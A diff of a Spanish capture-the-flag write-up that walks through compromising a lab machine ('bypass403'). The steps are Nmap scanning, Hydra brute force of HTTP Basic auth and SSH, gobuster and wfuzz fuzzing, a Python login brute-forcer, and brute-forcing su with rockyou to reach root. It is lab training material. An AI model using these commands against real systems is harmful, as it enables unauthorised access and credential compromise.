@@ -1,13 +1,17 @@
-## FASE DE ENUMERACIÓN
+# FASE DE ENUMERACIÓN
+
 Sabiendo que la IP de la máquina víctima es:
+
 ```bash
 172.17.0.2
 ```
-lanzamos un scaneo con nmap para ver que puertos tiene abiertos, que servicios corren por ellos y sus versiones por si son vulnerables:
+
+Lanzamos un escaneo con Nmap para ver qué puertos tiene abiertos, qué servicios corren por ellos y sus versiones, por si son vulnerables:
 
 ```bash
 sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2
 ```
+
 ```
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
@@ -26,13 +30,15 @@ PORT   STATE SERVICE REASON         VERSION
 
 Vemos dos puertos abiertos:
 
-  -Puerto 22 dónde corre SSH en versión no vulnerable y sin tener credenciales no podemos hacer nada
-  -Puerto 80 HTTP
+- Puerto 22, donde corre SSH en versión no vulnerable. Sin tener credenciales, no podemos hacer nada.
+- Puerto 80 (HTTP).
 
-Nos vamos a centrar en el puerfto 80, lanzamos un whatweb para ver si nos reporta algo interesante:
+Nos vamos a centrar en el puerto 80. Lanzamos un WhatWeb para ver si nos reporta algo interesante:
+
 ```bash
 whatweb http://172.17.0.2 -v
 ```
+
 ```
 WhatWeb report for http://172.17.0.2
 Status    : 401 Unauthorized
@@ -41,173 +47,115 @@ IP        : 172.17.0.2
 Country   : RESERVED, ZZ
 
 Summary   : Apache[2.4.62], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], WWW-Authenticate[Zona restringida][Basic]
-
-Detected Plugins:
-[ Apache ]
-        The Apache HTTP Server Project is an effort to develop and 
-        maintain an open-source HTTP server for modern operating 
-        systems including UNIX and Windows NT. The goal of this 
-        project is to provide a secure, efficient and extensible 
-        server that provides HTTP services in sync with the current 
-        HTTP standards. 
-
-        Version      : 2.4.62 (from HTTP Server Header)
-        Google Dorks: (3)
-        Website     : http://httpd.apache.org/
-
-[ HTTPServer ]
-        HTTP server header string. This plugin also attempts to 
-        identify the operating system from the server header. 
-
-        OS           : Debian Linux
-        String       : Apache/2.4.62 (Debian) (from server string)
-
-[ WWW-Authenticate ]
-        This plugin identifies the WWW-Authenticate HTTP header and 
-        extracts the authentication method and realm. 
-
-        Module       : Basic
-        String       : Zona restringida
-
-HTTP Headers:
-        HTTP/1.1 401 Unauthorized
-        Date: Thu, 03 Jul 2025 19:46:41 GMT
-        Server: Apache/2.4.62 (Debian)
-        WWW-Authenticate: Basic realm="Zona restringida"
-        Content-Length: 457
-        Connection: close
-        Content-Type: text/html; charset=iso-8859-1
+...
 ```
 
-Vemos que corre un apache versión 2.4.62 no vulnerable, pero en las cabeceras vemos un 401 y un WWW-Authenticate: Basic realm="Zona restringida", probablemente se trate de un panel de autentificación, vamos a la página web
-y efectivamente, mirando el código fuente (Ctrl+u) vemos:
-```
- <tt>/var/www/bypass403.pw/index.php</tt>) before continuing to operate your HTTP server.
-```
+Vemos que corre Apache versión 2.4.62 (no vulnerable). En las cabeceras observamos un 401 y un `WWW-Authenticate: Basic realm="Zona restringida"`. Probablemente se trate de un panel de autenticación.
 
-así que por si hay virtualhosting metemos el dominio bypass403.pw en el /etc/hosts
+Nos vamos a la página web y, efectivamente, mirando el código fuente (`Ctrl+U`) vemos:
 
 ```
+<tt>/var/www/bypass403.pw/index.php</tt>) before continuing to operate your HTTP server.
+```
+
+Por si hay virtual hosting, metemos el dominio `bypass403.pw` en el `/etc/hosts`:
+
+```bash
 sudo nano /etc/hosts
 ```
-y añadimos al final esta linea:
+
+Y añadimos al final esta línea:
+
 ```
 172.17.0.2      bypass403.pw
 ```
-ctrl+o para guardar y ctrl+x para salir
 
-Ahora vamos a ver como se tramita la petición de autentificación, abrimos el burpsuite y capturamos una petición, vemos que la petición es la siguiente:
+Guardar con `Ctrl+O` y salir con `Ctrl+X`.
+
+---
+
+## Análisis de la autenticación
+
+Capturamos una petición con BurpSuite y vemos  en las cabeceras lo siguiente:
+
 ```
 GET / HTTP/1.1
-
 Host: 172.17.0.2
-
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-
-Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
-
-Accept-Encoding: gzip, deflate, br
-
-Connection: keep-alive
-
-Upgrade-Insecure-Requests: 1
-
-If-Modified-Since: Tue, 10 Jun 2025 09:32:35 GMT
-
-If-None-Match: "29be-63734606012c0-gzip"
-
-Priority: u=0, i
-
+...
 Authorization: Basic ZmRnZGZnOmRmZ2RzZ2Y=
 ```
 
-lo que me llama la atenciñon es :
-```
-Authorization: Basic ZmRnZGZnOmRmZ2RzZ2Y=
-```
-parece un base64, lo decodeo:
+Parece Base64. Lo decodificamos:
 
 ```bash
-echo "ZmRnZGZnOmRmZ2RzZ2Y=" | base64 -d;echo                                                                                                                                                             
+echo "ZmRnZGZnOmRmZ2RzZ2Y=" | base64 -d; echo
 ```
+
 ```
 fdgdfg:dfgdsgf
 ```
 
-causlamente el user y el password que introduje.
+Coincide con el user:pass que introdujimos.
 
-En este punto me planteo como se tramita mi petición por detrás, está claro que se manda un user y un pass, y algo por detrás los une con dos puntos en medio y lo encode a base64, este hash se 
-comparará con la autentficación válida y si es correcta accederemos a algún sitio. Hay una opción con hydra que es "-C" que se utiliza para combinar usuario y contraseña, que en nuestro caso
-es "usuario:contraseña" en SecList hay un diccionario concretamente /SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt que contiene esas combinaciones, asíque vamos autilizarlo:
+---
+
+## Ataque con Hydra
+
+Sabemos que se concatena `usuario:contraseña` y se codifica en Base64. Usaremos Hydra con `-C` para probar combinaciones ya codificadas en este caso este diccionario usa la estructura `user:password`:
+
 ```bash
 hydra -C RUTA_AL_DICCIONARIO/ftp-betterdefaultpasslist.txt http-get://172.17.0.2/
 ```
+
+Resultado:
+
 ```
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-03 16:41:26
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
-[DATA] attacking http-get://172.17.0.2:80/
 [80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-03 16:41:27
 ```
-Tenemos user y pass:
+
+Credenciales válidas:
+
 ```
 httpadmin:fhttpadmin
 ```
 
-nos logueamos en la página y nos lleva a un index.html sin nada raro, ahora toca fuzzin con las credenciales:
+Nos logueamos. Nos lleva a un `index.html`, sin nada interesante. Toca fuzzing con las credenciales:
 
 ```bash
- gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip -U httpadmin -P fhttpadmin
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip -U httpadmin -P fhttpadmin
 ```
+
 ```
 /index.html           (Status: 200) [Size: 10701]
 /login.php            (Status: 200) [Size: 2798]
-
 ```
 
-nos vamos a login.php, y vemos otro panel de autentificación...vamos a realizar un ataque de fuerzabruta. capturamos la peticion:
+También con wfuzz:
+
+```bash
+wfuzz -c --hh=272 \
+  -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -z list,php,txt,bak,old,zip, \
+  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+  -u http://172.17.0.2/FUZZ.FUZ2Z
+```
+
+---
+
+## Ataque Fuerza Bruta en login.php
+
+Capturamos la petición POST:
+
 ```
 POST /login.php HTTP/1.1
-
-Host: 172.17.0.2
-
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-
-Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
-
-Accept-Encoding: gzip, deflate, br
-
-Content-Type: application/x-www-form-urlencoded
-
-Content-Length: 32
-
-Origin: http://172.17.0.2
-
 Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
-
-Connection: keep-alive
-
-Referer: http://172.17.0.2/login.php
-
-Upgrade-Insecure-Requests: 1
-
-Priority: u=0, i
-
-
-
+...
 username=admin&password=password
 ```
 
-vemos "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" esta cabecera la utiliza para estar autenticados como "httpadmin:fhttpadmin"
-así pues vamos a hacer un pequeño ataque.
+Creamos un script en Python:
 
-creo un script en python:
-```bash
+```python
 import requests
 import sys
 import os
@@ -249,56 +197,290 @@ if __name__ == "__main__":
         print("Uso: python script.py /ruta/usuarios.txt /ruta/passwords.txt")
         sys.exit(1)
 
-    users_file = sys.argv[1]
-    passwords_file = sys.argv[2]
+    users = load_words(sys.argv[1])
+    passwords = load_words(sys.argv[2])
+    brute_force(users, passwords)
+```
 
-    users = load_words(users_file)
-    passwords = load_words(passwords_file)
-```
-lo uso de esta manera:
-```
+Uso:
+
+```bash
 python script.py RUTA_DICCIONARIO_USUARIOS/users.txt /usr/share/wordlists/rockyou.txt
 ```
-En el diccionario de usuarios solo metí admin mario y guest, lo ejecuto:
+
+Resultado:
 
 ```
-❌ admin:123456
-❌ admin:12345
-❌ admin:123456789
-❌ admin:password
-❌ admin:iloveyou
-❌ admin:princess
-❌ admin:1234567
-❌ admin:rockyou
-❌ admin:12345678
-❌ admin:abc123
-❌ admin:nicole
-❌ admin:daniel
-❌ admin:babygirl
-❌ admin:monkey
-❌ admin:lovely
-❌ admin:jessica
-❌ admin:654321
-❌ admin:michael
-❌ admin:ashley
-❌ admin:qwerty
-❌ admin:111111
-❌ admin:iloveu
-❌ admin:000000
-❌ admin:michelle
-❌ admin:tigger
-❌ admin:sunshine
-
 ✅ ¡Credenciales válidas encontradas! -> Usuario: admin | Contraseña: chocolate
 ```
-pues vamos a loguearnos como admin:chocolate
 
-y tacan!!!
-otro user:
+Mensaje tras login:
 
 ```
 ¡Login correcto! Enhorabuena! De parte del usuario balutin, te damos la enhorabuena
 ```
-balutin...ahora toca fuerzabruta por SSH:
+
+---
+
+## Fuerza bruta con wfuzz (alternativa):
+
+```bash
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
+  -d "username=admin&password=FUZZ" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+  -u http://172.17.0.2/login.php \
+  --hh=2848
+```
+
+Resultado:
+
+```
+Payload: chocolate
+```
+
+---
+
+## Fuerza bruta por SSH
+Sabiendo un nuevo usuario que nos ha dado la página al hacer login `balutin`:
+```bash
+hydra -l balutin -P /usr/share/wordlists/rockyou.txt -t 16 -V -f -I ssh://172.17.0.2
+```
+
+```
+[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
+```
+
+Nos conectamos:
+
+```bash
+ssh balutin@172.17.0.2
+```
+
+---
+
+# FASE ESCALADA DE PRIVILEGIOS
+
+Comprobamos grupos:
+
+```bash
+id
+```
+
+```
+uid=1000(balutin) gid=1000(balutin) groups=1000(balutin),100(users)
+```
+
+Nada especial. 
+
+Comprobamos kernel:
+
+```bash
+uname -a
+```
+
+```
+Linux 28a4c6e82f24 6.12.33+kali-amd64 ...
+```
+
+Nada vulnerable.
+
+Miramos usuarios:
+
+```bash
+cat /etc/passwd | grep sh$
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+balutin:x:1000:1000:balutin,,,:/home/balutin:/bin/bash
+```
+
+Miramos permisos sudo:
+
+```bash
+sudo -l
+```
+
+```
+-bash: sudo: command not found
+```
+
+Miramos la variable de entorno:
+
+```bash
+printenv
+```
+
+```
+SHELL=/bin/bash
+PWD=/home/balutin
+LOGNAME=balutin
+MOTD_SHOWN=pam
+HOME=/home/balutin
+LANG=es_EC.UTF-8
+LS_COLORS=rs=0:di=01;34:...
+SSH_CONNECTION=172.17.0.1 37050 172.17.0.2 22
+TERM=xterm-256color
+USER=balutin
+SHLVL=1
+SSH_CLIENT=172.17.0.1 37050 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+SSH_TTY=/dev/pts/0
+_=/usr/bin/printenv
+```
+
+Nada relevante.
+
+---
 
 
+Buscamos binarios con bit SUID:
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+```
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+Nada interesante.
+
+Buscamos binarios con bit SGID:
+
+```bash
+find / -perm -2000 2>/dev/null
+```
+
+```
+/var/mail
+/var/local
+/var/log/journal
+/usr/bin/chage
+/usr/bin/expiry
+/usr/bin/ssh-agent
+/usr/sbin/unix_chkpwd
+```
+
+Nada útil.
+
+---
+
+## Sin pistas adicionales... Ataque de fuerza bruta a root
+
+Buscamos métodos para pasarnos archivos desde nuestra máquina:
+
+```bash
+which nc
+which wget
+which curl
+which scp
+```
+
+```
+/usr/bin/scp
+```
+
+Vemos que solo tenemos disponible `scp`.
+
+---
+
+## Transferencia de archivos con SCP
+
+El comando para copiar desde nuestra máquina local a la máquina víctima es:
+
+```
+scp ARCHIVO usuario@IP:/ruta/en/la/víctima
+```
+
+Ejemplo:
+
+```bash
+scp script.sh balutin@172.17.0.2:/tmp
+```
+
+---
+
+## Herramienta de fuerza bruta
+
+Podemos usar una herramienta de fuerza bruta para `su` como:
+
+- Nuestra propia herramienta en bash:  
+  https://github.com/lavafuego/herramientas/tree/main/fuerza%20bruta%20user%20script%20bash
+
+- Otra alternativa:  
+  https://github.com/d4t4s3c/suForce
+
+En nuestro caso he usado mi propia herramienta en bash el primer enlace que es copiar y pegar y no necesita pasarse por scp ni nada. Creamos el script con `nano` en la máquina víctima, lo pegamos y luego:
+
+```bash
+chmod +x script.sh
+```
+
+---
+
+## Transferencia del diccionario
+
+Pasamos `rockyou.txt` a la máquina víctima:
+
+```bash
+scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp
+```
+
+Introducimos la contraseña del usuario `balutin` cuando nos la pida.
+
+---
+
+## Ejecución del script
+
+Nos posicionamos en `/tmp` y ejecutamos:
+
+```bash
+cd /tmp
+./script.sh -u root -w rockyou.txt
+```
+
+Salida:
+
+```
+[#--------------------------------------------------]   0%
+¡Contraseña encontrada!: rockyou
+Terminated
+```
+
+---
+
+## Escalada a root
+
+Nos logueamos como root:
+
+```bash
+su root
+```
+
+Contraseña:
+
+```
+rockyou
+```
+
+💥 ¡Acceso root conseguido!
+
+```
+root@28a4c6e82f24:/tmp# whoami
+root
+```
+
+---
+
+✅ Escalada completada con éxito.
